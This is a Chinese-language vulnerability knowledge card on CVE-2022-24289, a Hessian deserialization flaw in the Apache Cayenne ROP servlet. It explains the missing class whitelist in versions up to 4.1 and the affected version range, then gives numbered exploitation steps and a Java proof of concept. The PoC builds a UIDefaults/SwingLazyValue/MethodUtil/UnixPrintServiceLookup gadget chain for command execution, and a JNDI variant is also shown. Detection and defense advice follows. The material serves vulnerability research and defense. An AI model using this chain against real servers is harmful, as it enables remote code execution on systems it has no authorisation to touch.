---
id: web-java-deser-hessian-cayenne-rop-servlet-entry
title: Apache Cayenne ROP Servlet Hessian 反序列化（CVE-2022-24289）：≤4.1 默认无白名单，UIDefaults/SwingLazyValue→MethodUtil→UnixPrintServiceLookup 命令执行
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-cayenne-rop-servlet-entry
aliases:
- Apache Cayenne
- Cayenne ROP
- CayenneRopServlet
- HessianROPSerializationService
- ROPServlet doPost
- CVE-2022-24289
- Cayenne 反序列化
tags:
- java
- hessian
- deserialization
- cayenne
- cve-2022-24289
- rop
- uidefaults
- swinglazyvalue
- methodutil
- unixprintservicelookup
- jdk-only
- rce
cve:
- CVE-2022-24289
affected_versions: Apache Cayenne 4.1 及更早版本（4.2 起默认启用 org.apache.cayenne.* 白名单）；官方公告附加条件：运行在未打补丁的旧 Java 版本、攻击者可访问 Cayenne ROP 客户端接口
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V511
  verified_at: '2026-11-11T04:54:44+08:00'
  notes: '已对照原文（13428）与全部 11 张图核对。重点 CVE/版本：img/07 为 Apache 官方公告截图，标题明确 ''CVE-2022-24289: Deserialization of untrusted data in the Hessian Component of Apache Cayenne 4.1 with older Java versions''，正文 ''In Apache Cayenne 4.1 and earlier, running on non-current patch versions of Java, an attacker with client access to Cayenne ROP...''，缓解为升级 Cayenne 4.2（默认 Hessian 白名单）或 Java 6u211/7u201/8u191/11.0.1+，与卡 affected_versions 完全一致。入口/白名单：img/01 HessianROPSerializationService 用原版 HessianInput/HessianOutput，img/03 ROPServlet.doPost 直接 deserialize(req.getInputStream(), ClientMessage.class)，img/08 createFactory 仅 resolver!=null 时加 org.apache.cayenne.*/dataMap 包并 setWhitelist(true)，img/09 @since 4.2 注入 serializationWhitelist（null），img/10 旧版 get() createFactory(resolver=null)，均吻合。gadget/PoC：exp 的 SwingLazyValue→MethodUtil→UnixPrintServiceLookup 与 maskmap HashMap$Node 构造与原文一致；img/05/11 为 InitialContext.doLookup JNDI 变体，img/06 栈显示 deserialize→ROPServlet.doPost→Jetty。保留说明：原文正文未附成功命令执行截图，img/11 为 JNDI 变体返回
    500，''成功rce''来自正文陈述与完整 exp；卡片 PoC 已标注未执行，结论以官方 CVE 与该公开链为据。dedup 报告 new（jdk-only-proxylazyvalue-chain 等为不同入口/gadget 家族，非同链）。已按公告设置 affected_versions。'
---

## 一句话结论

Apache Cayenne 的 ROP（Remote Object Persistence）Servlet 在 `doPost` 中直接把请求体交给 `HessianROPSerializationService.deserialize`（原版 Hessian `HessianInput.readObject`）；Cayenne 4.1 及更早版本在 `HessianConfig.createFactory(..., resolver=null)` 时不会加入任何白名单，因此任何能访问 ROP 端点（示例 `/cayenne-service`）的客户端都能发送 Hessian 载荷触发反序列化。文章用 JDK-only 链 `UIDefaults` + `SwingLazyValue`（经 `MethodUtil.invoke` 反射调 `UnixPrintServiceLookup.getDefaultPrintService`）实现命令执行；4.2 起默认加入 `org.apache.cayenne.*` 与 dataMap 包白名单并调用 `setWhitelist(true)`，即 CVE-2022-24289 的修复。

## 原理

- **入口链路**：`ROPServlet#doPost` → `serializationService.deserialize(req.getInputStream(), ClientMessage.class)` → `HessianROPSerializationService.deserialize` 创建 `com.caucho.hessian.io.HessianInput`、设置 `SerializerFactory` 后 `readObject()`。`HessianROPSerializationService` 使用的是原版 Hessian（`com.caucho.hessian`），没有自研安全过滤。
- **白名单边界（版本差异）**：`HessianConfig.createFactory(factoryNames, resolver, additionalWhitelist)` 只有在 `resolver != null` 时才追加 `org.apache.cayenne.*` 与各 dataMap 的 `getDefaultPackage()+".*"`，最后在 whitelist 非空时 `factory.getClassFactory().setWhitelist(true)`。4.2 的 `ServerHessianSerializationServiceProvider` 通过注入的 `ROPSerializationService` 白名单调用；4.1 及以前的 `get()` 直接 `createFactory(SERVER_SERIALIZER_FACTORIES, resolver=null)`，whitelist 为 null/空 → `setWhitelist` 不生效，Hessian 可实例化任意类。
- **Hessian Map 触发**：Hessian 的 `MapDeserializer.readMap` 会向 `HashMap` 放入反序列化出的键值；`HashMap.putVal` 在哈希冲突时调用键的 `equals`。把两个 `UIDefaults` 对象作为键放进同一个 HashMap，即可在反序列化时进入 `Hashtable.equals` → `UIDefaults.get(key)`。
- **UIDefaults/LazyValue**：`UIDefaults.get` 命中值为 `LazyValue` 时调用其 `createValue(this)`。`sun.swing.SwingLazyValue.createValue` 用 Bootstrap ClassLoader `Class.forName` 加载核心 JDK 类，并按参数类型 `getMethod` 后经 `sun.reflect.misc.MethodUtil.invoke` 调用——可将可调用范围从 public static 扩展到 public 实例方法（JDK 8 可用；JDK 11+ 移除了 `SwingLazyValue`）。
- **UnixPrintServiceLookup sink**：文章把 `SwingLazyValue` 指向 `sun.reflect.misc.MethodUtil.invoke`，参数包一层反射方法 `UnixPrintServiceLookup.getDefaultPrintService`，并把 `osname`、`lpcFirstCom`（命令数组）、`cmdIndex` 通过反射写入 lookup 对象；`getDefaultPrintService` 内部会执行 `lpcFirstCom[cmdIndex]`，从而执行任意命令（文章示例 `open -a calculator`）。
- **避开构造期触发**：直接在 HashMap 中 `put` 两个 `UIDefaults` 会在构造 payload 时就触发 `hashCode/equals` 导致提前执行；文章的 `maskmap` 通过反射直接构造 `java.util.HashMap$Node`、设置 `size` 与 `table`，把两个键塞进同一个桶而不调用 put，保证利用发生在目标端反序列化时。
- **为什么成立**：漏洞根因是“不可信 Hessian 输入 + 无类白名单”，与具体 gadget 无关；文章链只用 JDK 类（`javax.swing.UIDefaults`、`sun.swing.SwingLazyValue`、`sun.reflect.misc.MethodUtil`、`sun.print.UnixPrintServiceLookup`），不依赖目标 classpath 的第三方库。官方公告同时指出 JNDI/LDAP 类利用受 Java 版本缓解（6u211/7u201/8u191/11.0.1+ 默认 `com.sun.jndi.ldap.object.trustURLCodebase=false`），而文章的 JDK-only 链走 `sun.print`，不经过 LDAP。

## 触发条件

- 目标部署了 Apache Cayenne ROP 服务并暴露 `/cayenne-service`（或自定义 ROP Servlet 路径），攻击者可网络访问。
- Cayenne 版本为 4.1 及更早（未启用白名单）；或 4.2 但管理员错误配置/关闭了 whitelist。
- 目标 JDK 为 8 一类的版本（`sun.swing.SwingLazyValue`、`sun.print.UnixPrintServiceLookup` 可用）；其他 JDK 可换 `ProxyLazyValue` 或其他 sink，属同族问题。
- Hessian 反序列化入口没有额外类过滤/Java 反序列化过滤器。

## 利用步骤

1. 探测 ROP 端点：访问 `/cayenne-service`，确认返回 Hessian 错误栈或 `Content-Type: application/hessian` 接受 POST；必要时使用示例中的 Basic 认证头。
2. 准备 Hessian 序列化：`new SerializerFactory()` 并 `setAllowNonSerializable(true)`，用 `HessianROPSerializationService(serializerFactory).serialize(payload)` 生成字节。
3. 构造两个 `UIDefaults`，各自 `put("2", swingLazyValue)`；`SwingLazyValue` 的 className/methodName 指向 `sun.reflect.misc.MethodUtil.invoke`，参数封装 `UnixPrintServiceLookup.getDefaultPrintService` 的反射调用（lookup 对象的 `lpcFirstCom` 设为命令数组、`cmdIndex=0`、`osname` 改掉）。
4. 用反射构造 `HashMap$Node` 把两个 UIDefaults 放进同一 HashMap 桶（`size=2`、`table` 为节点数组），避免本地提前触发。
5. POST 字节到 ROP 端点（`Content-Type: application/hessian`，按需 Basic 认证），目标端 `readMap → HashMap.putVal → Hashtable.equals → UIDefaults.get → createValue → MethodUtil.invoke → 命令执行`。
6. 验证命令执行（弹计算器/写文件/回连），并对照返回栈确认走到了 `HessianROPSerializationService.deserialize`。

## PoC

文章给出的 JDK8 exp 核心（简化，未执行）：

```java
SerializerFactory sf = new SerializerFactory();
sf.setAllowNonSerializable(true);

UnixPrintServiceLookup lookup = new UnixPrintServiceLookup();
String cmd = "open -a calculator";
setField(lookup, "osname", "xx");
setField(lookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
setField(lookup, "cmdIndex", 0);

Method getPrintServices = lookup.getClass().getMethod("getDefaultPrintService");
Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
Object[] args = new Object[]{invoke, new Object(),
        new Object[]{getPrintServices, lookup, null}};
SwingLazyValue lazy = new SwingLazyValue(
        "sun.reflect.misc.MethodUtil", "invoke", args);

UIDefaults u1 = new UIDefaults(), u2 = new UIDefaults();
u1.put("2", lazy); u2.put("2", lazy);
HashMap payload = maskmap(u1, u2);   // 反射构造 HashMap$Node/table，避免 put 提前触发

byte[] body = new HessianROPSerializationService(sf).serialize(payload);
// POST http://target:8080/cayenne-service
// Content-Type: application/hessian
// Authorization: Basic Y2F5ZW5uZS11c2VyOnNlY3JldA==（按目标配置）
```

`maskmap` 的关键点为：`Class.forName("java.util.HashMap$Node")` 取 `(int,Object,Object,Node)` 构造器生成两个节点，反射设置 `HashMap.size=2`、`HashMap.table` 为节点数组。文章截图也展示了 JNDI 变体（`SwingLazyValue("javax.naming.InitialContext","doLookup", new Object[]{"rmi://127.0.0.1:1099/remoteExploit8"})`）作为同链的替换 sink。

## 变体与关联

- **同族 gadget**：`web-java-deser-hessian-jdk-only-proxylazyvalue-chain`（UIDefaults/ProxyLazyValue/SwingLazyValue 触发任意静态方法/构造，系统梳理了 toString/equals 触发与 ServerManagerImpl、JavaWrapper、MethodUtil 等 sink）。
- **同族 Hessian 入口**：`web-java-deser-hessian-hessianservlet-argument-header-entry`、`web-java-deser-hessian-seata-8091-rpc-codec22`、`web-java-deser-hessian-xxl-job-admin-api-entry`、`web-java-deser-hessian-nacos-raft-abstractprocessor-entry`。
- **变体**：JNDI/LDAP 远程类加载（受 Java 版本 trustURLCodebase 限制）；换 `ProxyLazyValue` 适配 JDK 11+；换其他 JDK sink（`System.load`、`JavaUtils.writeBytesToFilename`、`ServerManagerImpl`）。
- **修复边界**：4.2 的 `org.apache.cayenne.*` + dataMap 包白名单会拦下 JDK gadget；但若业务 dataMap 包内存在危险类，白名单仍可能被利用，需按实际包名审计。

## 检测与防御

- **升级**：升级到 Apache Cayenne 4.2+（默认白名单）；官方建议同时升级到已打补丁的 Java（JNDI/LDAP 缓解）。
- **白名单**：为 `HessianConfig.createFactory` 传入最小化的 `additionalWhitelist`，启用 `setWhitelist(true)`；拒绝 `javax.swing.UIDefaults`、`ProxyLazyValue`、`SwingLazyValue`、`MethodUtil`、`UnixPrintServiceLookup` 等 JDK gadget 类。
- **入口治理**：不要把 Cayenne ROP 端点暴露到不可信网络；强制认证、来源 IP 限制、TLS；如无 ROP 需求关闭 Servlet。
- **检测**：监控发往 ROP 路径的 `Content-Type: application/hessian` 请求与异常 Hessian 栈（`HessianProtocolException`、`readObject`、`HessianROPSerializationService.deserialize`）；JVM 侧监控 `UIDefaults.get`、`SwingLazyValue.createValue`、`MethodUtil.invoke`、`UnixPrintServiceLookup.getDefaultPrintService` 调用与进程创建；对 Hessian body 做类名黑名单/反序列化过滤器（Java JEP 290 filter）。
- **响应**：确认 ROP 端点暴露面与版本，抓取请求体做 Hessian 解析，排查同时间段进程创建与外联。
